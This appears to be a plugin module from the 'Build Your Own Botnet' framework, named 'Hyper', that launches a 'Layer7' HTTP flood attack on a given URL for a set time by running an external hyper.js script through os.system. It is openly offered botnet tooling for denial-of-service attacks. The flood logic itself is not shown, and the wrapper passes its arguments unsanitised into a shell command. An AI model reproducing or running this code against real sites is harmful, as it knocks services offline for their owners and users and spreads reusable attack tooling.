'Hyper (Build Your Own Botnet)'

import socket
import os
import requests
import random
import getpass
import time
import sys
import threading

command = True
packages = ['socket', 'os', 'requests', 'random', 'getpass', 'time', 'sys']
platforms = ['linux2']
usage = 'hyper [url] [time]'
description = """
Layer7 hyper attack
"""

def run(url=None, time=None):
    """
    Start attack
    """
    try:
        os.system(f'node hyper.js {url} {time}')
    except Exception as e:
        return "{} error: {}".format(run.__name__, str(e))